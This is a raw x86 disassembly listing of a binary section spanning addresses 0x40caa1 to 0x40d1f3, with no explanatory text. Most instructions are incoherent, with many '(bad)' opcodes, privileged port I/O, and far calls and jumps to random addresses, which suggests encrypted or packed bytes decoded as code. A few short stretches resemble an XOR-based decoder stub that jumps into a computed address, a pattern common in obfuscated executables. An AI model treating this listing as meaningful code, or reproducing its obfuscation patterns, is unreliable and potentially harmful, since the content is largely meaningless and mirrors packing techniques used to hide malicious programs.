  40caa1:	pop    ebp
  40caa2:	mov    ebp,0xf649e36
  40caa7:	aad    0xc7
  40caa9:	jno    0x40ca78
  40caab:	mov    cl,0x8e
  40caad:	xor    BYTE PTR [ebx],dh
  40caaf:	inc    ebx
  40cab0:	xchg   esi,eax
  40cab1:	mov    dl,0x35
  40cab3:	gs daa 
  40cab5:	lods   eax,DWORD PTR ds:[esi]
  40cab6:	mov    eax,ds:0x52e9cf98
  40cabb:	ss iret 
  40cabd:	dec    BYTE PTR [edx]
  40cabf:	and    BYTE PTR [ecx+0x4482a609],bl
  40cac5:	cmp    al,0xff
  40cac7:	push   sp
  40cac9:	lahf   
  40caca:	xchg   edx,eax
  40cacb:	ss inc ebp
  40cacd:	push   ss
  40cace:	xor    DWORD PTR [esi+0x41],eax
  40cad1:	mov    bh,0x16
  40cad3:	nop
  40cad4:	cli    
  40cad5:	int    0x76
  40cad7:	mov    ebp,0x75e4d613
  40cadc:	inc    ebx
  40cadd:	push   ecx
  40cade:	inc    esi
  40cadf:	je     0x40cabf
  40cae1:	xchg   ebx,eax
  40cae2:	pop    esp
  40cae3:	or     dl,BYTE PTR [esi+0x1c90d426]
  40cae9:	inc    edx
  40caea:	inc    esi
  40caeb:	mov    bh,BYTE PTR [edi+0x1f]
  40caee:	or     al,0x6a
  40caf0:	(bad)  
  40caf2:	mov    dh,0xfa
  40caf4:	ds nop
  40caf6:	push   ebp
  40caf7:	fwait
  40caf8:	or     ecx,edi
  40cafa:	aam    0xbb
  40cafc:	daa    
  40cafd:	(bad)  
  40cafe:	jecxz  0x40cb15
  40cb00:	dec    ah
  40cb02:	icebp  
  40cb03:	call   ecx
  40cb05:	sbb    DWORD PTR [ecx-0x2f81f00b],esi
  40cb0b:	ret    0xafb4
  40cb0e:	sub    al,0xbe
  40cb10:	mov    ds:0x194bfbcb,eax
  40cb15:	out    0xb7,eax
  40cb17:	mov    esi,0x89aa43bd
  40cb1c:	mov    ebp,0x4227596c
  40cb21:	in     al,dx
  40cb22:	sbb    ebx,DWORD PTR [eax+0x43e26a6f]
  40cb28:	ins    DWORD PTR es:[edi],dx
  40cb29:	push   0x547b1648
  40cb2e:	test   DWORD PTR [eax+esi*2-0x4d0e9860],esp
  40cb35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb36:	cmp    ebx,esi
  40cb38:	lock jno 0x40cade
  40cb3b:	push   ds
  40cb3c:	cmp    DWORD PTR [ebp+0x27],esi
  40cb3f:	clc    
  40cb40:	cmp    al,0x55
  40cb43:	popf   
  40cb44:	(bad)  
  40cb45:	scas   al,BYTE PTR es:[edi]
  40cb46:	pop    ebx
  40cb47:	fst    st(0)
  40cb49:	std    
  40cb4a:	mov    esi,es
  40cb4c:	fadd   DWORD PTR [edx-0x3]
  40cb4f:	push   ebp
  40cb50:	jno    0x40cb90
  40cb52:	dec    esi
  40cb53:	cwde   
  40cb54:	adc    ch,dl
  40cb56:	out    0x89,al
  40cb58:	dec    esi
  40cb59:	mov    ecx,0xd31b77f2
  40cb5e:	or     ebp,edx
  40cb60:	dec    eax
  40cb61:	pop    eax
  40cb62:	outs   dx,BYTE PTR ds:[esi]
  40cb63:	cld    
  40cb64:	push   edi
  40cb65:	pop    esp
  40cb66:	mov    dl,BYTE PTR [bp-0x18]
  40cb6a:	mov    dl,BYTE PTR [ecx-0x7bbe1100]
  40cb70:	(bad)  
  40cb71:	fimul  DWORD PTR [edi+0x48]
  40cb74:	or     al,0x77
  40cb76:	push   ebx
  40cb77:	retf   0x98c
  40cb7a:	add    eax,0x930ede00
  40cb7f:	(bad)  ds:0xf83ad24d
  40cb85:	mov    ah,0xce
  40cb87:	ds mov eax,0x3c17b426
  40cb8d:	pop    ecx
  40cb8e:	and    al,0x97
  40cb90:	stos   BYTE PTR es:[edi],al
  40cb91:	aaa    
  40cb92:	jp     0x40cbfa
  40cb94:	cmp    eax,0xfc60379
  40cb99:	scas   eax,DWORD PTR es:[edi]
  40cb9a:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x37]
  40cbfc:	arpl   WORD PTR [ecx+0x7e8c623f],bp
  40cc02:	jle    0x40cc3c
  40cc04:	jl     0x40cc84
  40cc06:	jle    0x40cc82
  40cc08:	jge    0x40cb9b
  40cc0a:	ffree  st(5)
  40cc0c:	cmp    dh,ah
  40cc0e:	inc    edi
  40cc0f:	stos   DWORD PTR es:[edi],eax
  40cc10:	sub    dh,BYTE PTR [ebx]
  40cc12:	pop    ecx
  40cc13:	add    esp,eax
  40cc15:	mul    bh
  40cc17:	cld    
  40cc18:	pop    ds
  40cc19:	bound  edi,QWORD PTR [edi]
  40cc1b:	hlt    
  40cc1c:	leave  
  40cc1d:	or     eax,DWORD PTR [esi]
  40cc1f:	pop    ebx
  40cc20:	dec    ecx
  40cc21:	int3   
  40cc22:	mov    bh,0x3a
  40cc24:	mul    dh
  40cc26:	cmp    eax,0xc72cb6ee
  40cc2b:	fild   DWORD PTR [ebx+0x32c7a0fe]
  40cc31:	mov    ah,0x71
  40cc33:	aad    0xfb
  40cc35:	mov    ebx,0xe2556b39
  40cc3a:	out    0xc1,eax
  40cc3c:	nop
  40cc3d:	sahf   
  40cc3e:	sbb    esi,DWORD PTR [edi+0x1d]
  40cc41:	lea    ecx,[ebx+0x77]
  40cc44:	popa   
  40cc45:	ror    DWORD PTR [esi-0x854161],1
  40cc4b:	pushf  
  40cc4c:	ins    DWORD PTR es:[edi],dx
  40cc4d:	call   0xff5d:0x286dd7d7
  40cc54:	pop    ds
  40cc55:	xor    DWORD PTR [ecx+0x2],ecx
  40cc58:	es inc ebx
  40cc5a:	and    al,0x84
  40cc5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc5d:	xchg   esi,eax
  40cc5e:	dec    edi
  40cc5f:	aaa    
  40cc60:	(bad)  
  40cc61:	loopne 0x40cbec
  40cc63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc64:	out    0x49,al
  40cc66:	mov    BYTE PTR [eax+0x20e9a583],al
  40cc6c:	mov    esp,DWORD PTR [edi-0x40]
  40cc6f:	pop    edi
  40cc70:	or     cl,BYTE PTR [edx]
  40cc72:	cs mov esp,0xb6919fd2
  40cc78:	ret    
  40cc79:	(bad)  
  40cc7b:	add    eax,0xc2e2c21c
  40cc80:	xor    eax,0xb1ee6302
  40cc85:	call   0x8922:0xfe51706f
  40cc8c:	push   0x33
  40cc8e:	jnp    0x40ccc7
  40cc90:	sub    ah,cl
  40cc92:	nop
  40cc93:	fisttp WORD PTR cs:0x874d89b1
  40cc9a:	repnz fist DWORD PTR [ecx+esi*8]
  40cc9e:	into   
  40cc9f:	ret    
  40cca0:	data16 aam 0xf4
  40cca3:	sahf   
  40cca4:	icebp  
  40cca5:	inc    edi
  40cca6:	aad    0x79
  40cca8:	or     al,0x8e
  40ccaa:	sub    dl,BYTE PTR [esi-0x79178913]
  40ccb0:	add    eax,0x8c3a700a
  40ccb5:	push   es
  40ccb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccb7:	frstor [esi-0x7a]
  40ccba:	inc    ebp
  40ccbb:	dec    ebp
  40ccbc:	stos   DWORD PTR es:[edi],eax
  40ccbd:	leave  
  40ccbe:	cld    
  40ccbf:	push   edx
  40ccc0:	sbb    dl,BYTE PTR [edi+edi*1]
  40ccc3:	sub    DWORD PTR [edi+0x77],esp
  40ccc6:	jecxz  0x40cc81
  40ccc8:	inc    edx
  40ccc9:	das    
  40ccca:	fs push 0xffffffe9
  40cccd:	test   BYTE PTR [ebx+0x976572e],0x5b
  40ccd4:	mov    ds:0xf1d00f91,al
  40ccd9:	data16 jge 0x40ccc3
  40ccdc:	sbb    eax,DWORD PTR [edi]
  40ccde:	addr16 lahf 
  40cce0:	mov    dh,BYTE PTR [eax+0x7b]
  40cce3:	repnz outs dx,DWORD PTR ds:[esi]
  40cce5:	xlat   BYTE PTR ds:[ebx]
  40cce6:	jmp    0xe65e:0x55e87d21
  40cced:	enter  0x6514,0x29
  40ccf1:	and    edx,DWORD PTR ds:0xfbf93eed
  40ccf7:	test   al,0xd
  40ccf9:	iret   
  40ccfa:	ins    DWORD PTR es:[edi],dx
  40ccfb:	pop    ds
  40ccfc:	sub    esp,0x5d680425
  40cd02:	and    BYTE PTR ds:0x6d19b722,ch
  40cd08:	stos   BYTE PTR es:[edi],al
  40cd09:	and    DWORD PTR [edi-0x78],ecx
  40cd0c:	or     eax,0x6c4ad5ed
  40cd11:	into   
  40cd12:	test   eax,0x69c0446
  40cd17:	stos   BYTE PTR es:[edi],al
  40cd18:	xchg   ebp,eax
  40cd19:	pusha  
  40cd1a:	adc    dh,BYTE PTR [eax]
  40cd1c:	xchg   esp,eax
  40cd1d:	dec    edi
  40cd1e:	and    eax,0x9edf8ca7
  40cd23:	shl    DWORD PTR [ebx-0x522f983a],0x1d
  40cd2a:	cmp    al,0xf
  40cd2c:	add    esp,eax
  40cd2e:	xchg   BYTE PTR [edi-0x9],dh
  40cd31:	sbb    ebp,edx
  40cd33:	mov    ds:0x23b8875f,al
  40cd38:	cld    
  40cd39:	mov    cl,0x23
  40cd3b:	mov    ecx,0x196a1cbb
  40cd40:	cs sbb al,0x7a
  40cd43:	out    dx,al
  40cd44:	jmp    0x40cd9e
  40cd46:	addr16 dec edi
  40cd48:	scas   al,BYTE PTR es:[edi]
  40cd49:	cwde   
  40cd4a:	pop    ebp
  40cd4b:	mov    edx,0x13c2e459
  40cd50:	push   edi
  40cd51:	and    esp,eax
  40cd53:	sbb    al,0xda
  40cd55:	inc    ebp
  40cd56:	loopne 0x40cd8a
  40cd58:	push   edi
  40cd59:	ret    
  40cd5a:	cmp    al,0x2d
  40cd5c:	mov    bl,0xdd
  40cd5e:	mov    ebp,DWORD PTR [esi]
  40cd60:	in     eax,dx
  40cd61:	xchg   DWORD PTR [edi-0xaed47cc],ebp
  40cd67:	xor    eax,DWORD PTR [ebx-0x451c2fe2]
  40cd6d:	dec    eax
  40cd6e:	stos   BYTE PTR es:[edi],al
  40cd6f:	dec    ebp
  40cd70:	jb     0x40cddc
  40cd72:	shr    DWORD PTR [ebx],0x8a
  40cd75:	push   esi
  40cd76:	js     0x40cde0
  40cd78:	push   ebp
  40cd79:	dec    esp
  40cd7a:	push   es
  40cd7b:	jl     0x40cd7a
  40cd7d:	push   ss
  40cd7e:	aaa    
  40cd7f:	in     eax,0x16
  40cd81:	loop   0x40cd0e
  40cd83:	dec    edx
  40cd84:	pop    eax
  40cd85:	nop
  40cd86:	sub    al,0x42
  40cd88:	jnp    0x40cd36
  40cd8a:	pop    esp
  40cd8b:	je     0x40cdec
  40cd8d:	mov    es,WORD PTR [eax+0x55]
  40cd90:	push   ds
  40cd91:	dec    BYTE PTR [edx+0x562837d2]
  40cd97:	lock dec esp
  40cd99:	stos   BYTE PTR es:[edi],al
  40cd9a:	test   BYTE PTR [eax],dh
  40cd9c:	ret    
  40cd9d:	leave  
  40cd9e:	and    BYTE PTR [ecx-0x74a8120c],ah
  40cda4:	mov    dh,0x7d
  40cda6:	enter  0x539c,0xc4
  40cdaa:	push   esp
  40cdab:	mov    ?,WORD PTR [edi+0x74]
  40cdae:	jae    0x40cd78
  40cdb0:	or     edx,ecx
  40cdb2:	pusha  
  40cdb3:	cmc    
  40cdb4:	add    eax,0xdea69e01
  40cdb9:	bound  edx,QWORD PTR [esi]
  40cdbb:	adc    ebx,DWORD PTR [eax+0x5e]
  40cdbe:	jb     0x40cd82
  40cdc0:	mov    ebp,0x3cc2783e
  40cdc5:	call   0x16ad4c33
  40cdca:	lahf   
  40cdcb:	or     ecx,DWORD PTR [ebx+0x3d]
  40cdce:	xor    al,0xaf
  40cdd0:	mov    ds:0x5f5c590f,al
  40cdd5:	xchg   ecx,eax
  40cdd6:	push   ebp
  40cdd7:	mov    dl,0x5f
  40cdd9:	std    
  40cdda:	xor    BYTE PTR [ebp-0x3c],ch
  40cddd:	xor    esp,DWORD PTR [edi]
  40cddf:	inc    ebx
  40cde0:	(bad)  
  40cde1:	(bad)  
  40cde2:	pop    edx
  40cde3:	cmp    BYTE PTR [edx-0x72],0x91
  40cde7:	pop    ebx
  40cde8:	in     eax,dx
  40cde9:	cmp    eax,0xa08ecc7
  40cdee:	daa    
  40cdef:	mov    WORD PTR [ecx+0x75],es
  40cdf2:	mov    esi,0x6d2435b5
  40cdf7:	inc    BYTE PTR [edi+0x8]
  40cdfa:	and    cl,BYTE PTR [edx+0x43]
  40cdfd:	cmc    
  40cdfe:	retf   
  40cdff:	dec    eax
  40ce00:	jmp    0x73b2290d
  40ce05:	mov    edi,0xeedc028
  40ce0a:	mov    bh,bh
  40ce0c:	fstp   st(4)
  40ce0e:	and    DWORD PTR [edx],ecx
  40ce10:	push   ds
  40ce11:	xchg   edx,eax
  40ce12:	dec    ecx
  40ce13:	inc    ebp
  40ce14:	inc    eax
  40ce15:	inc    eax
  40ce16:	fistp  DWORD PTR fs:[edx]
  40ce19:	fiadd  DWORD PTR [eax+0x259be698]
  40ce1f:	pushf  
  40ce20:	jnp    0x40cdcf
  40ce22:	jmp    FWORD PTR [ecx+eax*8]
  40ce25:	repnz cdq 
  40ce27:	loope  0x40cdb1
  40ce29:	lahf   
  40ce2a:	mov    ds:0xea443e58,al
  40ce2f:	or     eax,0xdffb7cff
  40ce34:	xor    ebx,ecx
  40ce36:	xor    dh,bh
  40ce38:	jns    0x40ce68
  40ce3a:	iret   
  40ce3b:	xchg   ebx,eax
  40ce3c:	mov    ch,0xc0
  40ce3e:	aas    
  40ce3f:	xchg   edx,eax
  40ce40:	push   ebx
  40ce41:	(bad)  gs:[edx+0x4e]
  40ce45:	shl    DWORD PTR [esi-0x6a5cc618],cl
  40ce4b:	dec    ecx
  40ce4c:	bound  ebp,QWORD PTR [ebx]
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	(bad)  
  40ce63:	int3   
  40ce64:	in     eax,0x1e
  40ce66:	sub    al,0x8b
  40ce68:	jle    0x40cee8
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	or     BYTE PTR [esp+esi*2],dh
  40ce71:	imul   ebx,DWORD PTR [edi+eiz*4],0x4f462574
  40ce78:	mul    esp
  40ce7a:	fwait
  40ce7b:	(bad)  
  40ce7c:	push   0x4d
  40ce7e:	mov    eax,ds:0x5e3c6a26
  40ce83:	xchg   esi,edi
  40ce85:	(bad)  
  40ce86:	or     eax,esi
  40ce88:	es pop es
  40ce8a:	loop   0x40ceb9
  40ce8c:	cmp    BYTE PTR [esp+eax*2-0x3185dbc6],al
  40ce93:	shl    esi,cl
  40ce95:	cmp    esi,DWORD PTR [ebp+0x25288718]
  40ce9b:	inc    ebp
  40ce9c:	scas   al,BYTE PTR es:[edi]
  40ce9d:	cmc    
  40ce9e:	aad    0x5
  40cea0:	pop    esi
  40cea1:	sub    eax,0x449f0daa
  40cea6:	xchg   esi,eax
  40cea7:	jbe    0x40cf27
  40cea9:	jae    0x40cf29
  40ceab:	add    BYTE PTR [ebx+ebx*1-0x1b5a2695],0x7c
  40ceb3:	pop    ebp
  40ceb4:	int    0xdf
  40ceb6:	dec    edi
  40ceb7:	pusha  
  40ceb8:	lods   al,BYTE PTR ds:[esi]
  40ceb9:	lock cdq 
  40cebb:	mov    al,ds:0xcd878eca
  40cec0:	inc    ecx
  40cec1:	adc    al,0xd7
  40cec3:	or     edx,DWORD PTR [esi+0x4e]
  40cec6:	or     al,0x43
  40cec8:	sub    DWORD PTR [edi+0x10e3697e],esi
  40cece:	mov    edx,0xa3410fc2
  40ced3:	scas   eax,DWORD PTR es:[edi]
  40ced4:	mov    eax,esp
  40ced6:	fwait
  40ced7:	in     al,dx
  40ced8:	loop   0x40cf29
  40ceda:	xor    eax,0x16eb3e1a
  40cedf:	push   edx
  40cee0:	je     0x40ce8a
  40cee2:	adc    cl,ch
  40cee4:	dec    edx
  40cee5:	dec    edi
  40cee6:	es mov ch,0x7d
  40cee9:	and    cl,BYTE PTR [esi-0x1f3bfc79]
  40ceef:	out    0x2b,eax
  40cef1:	fiadd  WORD PTR [edx]
  40cef3:	mov    ah,0x62
  40cef5:	call   0x489e:0x5f705cba
  40cefc:	dec    ebp
  40cefd:	ror    BYTE PTR [eax+0x5dc2019d],cl
  40cf03:	out    0x91,al
  40cf05:	xor    al,0x73
  40cf07:	or     DWORD PTR [edx],0xffffffb4
  40cf0a:	les    ebp,FWORD PTR [ecx-0x5d]
  40cf0d:	loopne 0x40cf03
  40cf0f:	fiadd  DWORD PTR [ecx]
  40cf11:	inc    esp
  40cf12:	sbb    DWORD PTR [ebx],esi
  40cf14:	retf   0xcccf
  40cf17:	aas    
  40cf18:	je     0x40cf6a
  40cf1a:	mov    ds:0x5a555ee0,eax
  40cf1f:	ret    0xf367
  40cf22:	out    dx,al
  40cf23:	loop   0x40cee2
  40cf25:	cmp    ah,BYTE PTR [edx-0x61]
  40cf28:	jno    0x40cecc
  40cf2a:	lods   al,BYTE PTR ds:[esi]
  40cf2b:	or     ch,al
  40cf2d:	dec    esi
  40cf2e:	add    bh,BYTE PTR [ecx-0x2]
  40cf31:	mov    ch,0xb
  40cf33:	cmp    eax,DWORD PTR [esi-0x66dfff3d]
  40cf39:	dec    eax
  40cf3a:	sbb    DWORD PTR [ecx+0x31],ebx
  40cf3d:	push   es
  40cf3e:	rcr    BYTE PTR [edx-0x237214d5],0x2b
  40cf45:	outs   dx,BYTE PTR ds:[esi]
  40cf46:	sar    BYTE PTR [ebx+esi*1-0x20],cl
  40cf4a:	arpl   WORD PTR [eax-0x24],sp
  40cf4d:	out    0x8f,eax
  40cf4f:	aas    
  40cf50:	push   eax
  40cf51:	je     0x40cf8b
  40cf53:	in     eax,dx
  40cf54:	in     eax,0xff
  40cf56:	jbe    0x40cfad
  40cf58:	sbb    bh,BYTE PTR [esi+0x4a]
  40cf5b:	retf   
  40cf5c:	add    BYTE PTR [ecx],bh
  40cf5e:	push   edi
  40cf5f:	popf   
  40cf60:	lods   eax,DWORD PTR ds:[esi]
  40cf61:	int    0x6c
  40cf63:	mov    gs,esi
  40cf65:	push   edx
  40cf66:	and    al,0x18
  40cf68:	dec    edx
  40cf69:	aas    
  40cf6a:	mov    eax,DWORD PTR [ebp+0x68b881f3]
  40cf70:	push   cs
  40cf71:	cli    
  40cf72:	rcr    DWORD PTR [edi-0x18a20291],0xab
  40cf79:	xor    al,0xe0
  40cf7b:	push   0x3e78c265
  40cf80:	js     0x40cf0b
  40cf82:	add    eax,0xa7f63c29
  40cf87:	push   0x7a
  40cf89:	ficom  DWORD PTR ds:0x93e7221
  40cf8f:	mov    al,ds:0xf5d567a9
  40cf94:	and    eax,0xeaf0029f
  40cf99:	push   esi
  40cf9a:	aad    0x77
  40cf9c:	cli    
  40cf9d:	or     eax,edx
  40cf9f:	mul    esp
  40cfa1:	ja     0x40cffc
  40cfa3:	adc    ecx,edi
  40cfa5:	cs clc 
  40cfa7:	ds int 0x9
  40cfaa:	dec    esp
  40cfab:	fwait
  40cfac:	xchg   ebx,eax
  40cfad:	stos   BYTE PTR es:[edi],al
  40cfae:	and    BYTE PTR [ebx-0x5c],al
  40cfb1:	jb     0x40cf76
  40cfb3:	jge    0x40cf6f
  40cfb5:	loopne 0x40cfb2
  40cfb7:	mov    ah,0x61
  40cfb9:	scas   eax,DWORD PTR es:[edi]
  40cfba:	fdivr  DWORD PTR [edx]
  40cfbc:	push   esp
  40cfbd:	push   es
  40cfbe:	call   0xce67:0xc37f4c06
  40cfc5:	push   ebp
  40cfc6:	sahf   
  40cfc7:	ret    
  40cfc8:	cmp    ebp,ebx
  40cfca:	jbe    0x40cf62
  40cfcc:	addr16 pop es
  40cfce:	push   ss
  40cfcf:	pushf  
  40cfd0:	aaa    
  40cfd1:	cmp    al,0xbb
  40cfd3:	daa    
  40cfd4:	out    dx,eax
  40cfd5:	add    dl,BYTE PTR [edx]
  40cfd7:	in     eax,dx
  40cfd8:	mov    ah,0x20
  40cfda:	lods   eax,DWORD PTR ds:[esi]
  40cfdb:	add    BYTE PTR [ecx+esi*2-0xd],0x76
  40cfe0:	sub    BYTE PTR [ecx+ebx*4],0xf9
  40cfe4:	(bad)  
  40cfe5:	mov    bl,0x39
  40cfe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfe8:	lods   eax,DWORD PTR ds:[esi]
  40cfe9:	sbb    dh,ch
  40cfeb:	int3   
  40cfec:	push   es
  40cfed:	sbb    ebx,0xfffffff2
  40cff0:	add    ah,BYTE PTR fs:[edi]
  40cff3:	xor    BYTE PTR ds:0x1def3517,0x9b
  40cffa:	fcmovne st,st(7)
  40cffc:	push   ss
  40cffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cffe:	sub    al,0x99
  40d000:	add    eax,0xc7e8a457
  40d005:	out    dx,eax
  40d006:	(bad)  [esi+0x65bd06d1]
  40d00c:	cmp    eax,0x3878e5bf
  40d011:	xor    eax,0xa47c6ea3
  40d016:	js     0x40d01a
  40d018:	daa    
  40d019:	add    BYTE PTR ds:0xc1c3f8dd,bh
  40d01f:	sub    DWORD PTR [edx-0x524486d5],ecx
  40d025:	ret    0xee40
  40d028:	cld    
  40d029:	cmp    dh,BYTE PTR [eax-0x5e85bfc9]
  40d02f:	cli    
  40d030:	nop
  40d031:	or     al,0x98
  40d033:	add    eax,DWORD PTR [ecx-0x316b25d8]
  40d039:	rol    BYTE PTR [ebx],0x3e
  40d03c:	mov    eax,ds:0xde2f0538
  40d041:	ss clc 
  40d043:	fwait
  40d044:	ds pop edi
  40d046:	or     BYTE PTR [edx+0x25],cl
  40d049:	outs   dx,DWORD PTR ds:[esi]
  40d04a:	or     al,ah
  40d04c:	add    al,0xab
  40d04e:	pushf  
  40d04f:	addr16 das 
  40d051:	(bad)  [edi]
  40d053:	cmc    
  40d054:	ja     0x40d011
  40d056:	test   DWORD PTR [eax+edx*8+0x3f],esi
  40d05a:	outs   dx,DWORD PTR ds:[esi]
  40d05b:	(bad)  es:[edi-0x2c6418f7]
  40d062:	sti    
  40d063:	and    eax,0xdcb988be
  40d068:	jg     0x40d03d
  40d06a:	pop    ebx
  40d06b:	mov    dh,0x25
  40d06d:	xlat   BYTE PTR ds:[ebx]
  40d06e:	call   FWORD PTR [edx-0x312dc4b9]
  40d074:	pusha  
  40d075:	rcr    DWORD PTR [ebx],1
  40d077:	xor    eax,0x930d2321
  40d07c:	sbb    ch,dl
  40d07e:	sti    
  40d07f:	stc    
  40d080:	mov    ds:0x9b786c8d,al
  40d085:	push   ebx
  40d086:	and    ebx,DWORD PTR [eax-0x743e0c5]
  40d08c:	out    0xbd,eax
  40d08e:	das    
  40d08f:	fbstp  TBYTE PTR [ecx]
  40d091:	inc    edx
  40d092:	xor    ebx,edi
  40d094:	rcr    al,0x15
  40d097:	dec    ecx
  40d098:	call   0xa901724
  40d09d:	sub    cl,BYTE PTR [edi]
  40d09f:	cmp    ah,bl
  40d0a1:	outs   dx,BYTE PTR ds:[esi]
  40d0a2:	jnp    0x40d059
  40d0a4:	gs push ss
  40d0a6:	or     BYTE PTR [ebx-0x66],bh
  40d0a9:	push   esp
  40d0aa:	pop    eax
  40d0ab:	je     0x40d044
  40d0ad:	xor    eax,0x1bf88daf
  40d0b2:	xchg   DWORD PTR [ebp+0x49],edx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	cmp    eax,0xf6c665f5
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	cld    
  40d0dc:	pushf  
  40d0dd:	imul   BYTE PTR [ecx-0x497ef531]
  40d0e3:	cmp    al,0xd7
  40d0e5:	ds mov esi,0xfe4bb2ab
  40d0eb:	lahf   
  40d0ec:	mov    edi,0x444b4c1c
  40d0f1:	mov    cl,0x3
  40d0f3:	ds shr DWORD PTR gs:[ebp-0x582a0f50],cl
  40d0fb:	call   0xef9dc168
  40d100:	pusha  
  40d101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d102:	xor    ecx,esi
  40d104:	pop    ecx
  40d105:	xchg   ebp,eax
  40d106:	bound  esi,QWORD PTR [eax+0x668a7a12]
  40d10c:	daa    
  40d10d:	dec    esp
  40d10e:	inc    edi
  40d10f:	out    dx,al
  40d110:	int3   
  40d111:	cld    
  40d112:	fldcw  WORD PTR [eax+0x37d220b8]
  40d118:	test   BYTE PTR [eax+0x4e],0xd8
  40d11c:	and    al,0x5c
  40d11e:	out    0x4d,al
  40d120:	push   DWORD PTR [ebx+0x7814d166]
  40d126:	adc    eax,0xb2f9272f
  40d12b:	adc    eax,DWORD PTR [ebx-0x6069651e]
  40d131:	idiv   BYTE PTR [ebp+edx*8-0x45]
  40d135:	arpl   WORD PTR [ebx-0x64a652da],di
  40d13b:	retf   0xf1bd
  40d13e:	xchg   esi,eax
  40d13f:	mov    ah,0x0
  40d141:	pop    ss
  40d142:	out    dx,al
  40d143:	add    BYTE PTR ds:0x1a5594b5,ah
  40d149:	sub    BYTE PTR [ecx+0x3e61c406],al
  40d14f:	mov    ds:0x473c1a82,eax
  40d154:	daa    
  40d155:	mov    bl,0x69
  40d157:	fisub  DWORD PTR [ebx+0x7]
  40d15a:	xor    al,BYTE PTR [ebx-0x51acc024]
  40d160:	xchg   ebp,eax
  40d161:	fmul   st,st(2)
  40d163:	mov    eax,ds:0xe594b624
  40d168:	xchg   edx,eax
  40d169:	pop    eax
  40d16a:	retf   
  40d16b:	out    0xb8,eax
  40d16d:	xor    bh,0x50
  40d170:	xor    al,0x9b
  40d172:	(bad)  
  40d173:	jg     0x40d124
  40d175:	pop    esp
  40d176:	repnz mov esp,0x29e06d5d
  40d17c:	enter  0x1df6,0xfc
  40d180:	lods   al,BYTE PTR ds:[esi]
  40d181:	jae    0x40d183
  40d183:	int3   
  40d184:	sbb    ah,ch
  40d186:	(bad)  
  40d188:	or     bl,BYTE PTR [ecx-0x3]
  40d18b:	fsubr  QWORD PTR cs:[edx+0x68]
  40d18f:	inc    ebp
  40d190:	repnz cmp eax,0x9d68c6b7
  40d196:	rcr    DWORD PTR [eax-0x7a],1
  40d199:	shl    al,1
  40d19b:	push   0x39
  40d19d:	js     0x40d181
  40d19f:	jo     0x40d1fb
  40d1a1:	out    0x88,al
  40d1a3:	sub    BYTE PTR [ecx+eax*4],bh
  40d1a6:	jle    0x40d204
  40d1a8:	repnz outs dx,DWORD PTR ds:[esi]
  40d1aa:	xchg   esi,eax
  40d1ab:	dec    edi
  40d1ac:	aad    0x7c
  40d1ae:	pop    ebx
  40d1af:	push   ecx
  40d1b0:	adc    al,0x1f
  40d1b2:	cmp    edx,ecx
  40d1b4:	outs   dx,DWORD PTR ds:[esi]
  40d1b5:	daa    
  40d1b6:	xor    edi,DWORD PTR [edi]
  40d1b8:	dec    esi
  40d1b9:	adc    cl,dh
  40d1bb:	or     al,0x5f
  40d1bd:	cmp    DWORD PTR [ecx-0x560a39d3],edi
  40d1c3:	inc    BYTE PTR [ecx]
  40d1c5:	sbb    BYTE PTR [ecx+esi*2+0xa73f8f8],bl
  40d1cc:	das    
  40d1cd:	not    ch
  40d1cf:	out    0xb2,al
  40d1d1:	aaa    
  40d1d2:	aaa    
  40d1d3:	loop   0x40d1b7
  40d1d5:	stc    
  40d1d6:	imul   ebp,DWORD PTR gs:[edx+0x9],0xffffffef
  40d1db:	inc    edx
  40d1dc:	adc    ecx,DWORD PTR [esi+0x56]
  40d1df:	jns    0x40d1f2
  40d1e1:	ret    
  40d1e2:	add    BYTE PTR [edi-0x6d31d041],dl
  40d1e8:	xor    dh,BYTE PTR [ebx-0x53ac7912]
  40d1ee:	adc    DWORD PTR [eax+edx*4],esi
  40d1f1:	int    0x7
  40d1f3:	inc    esi
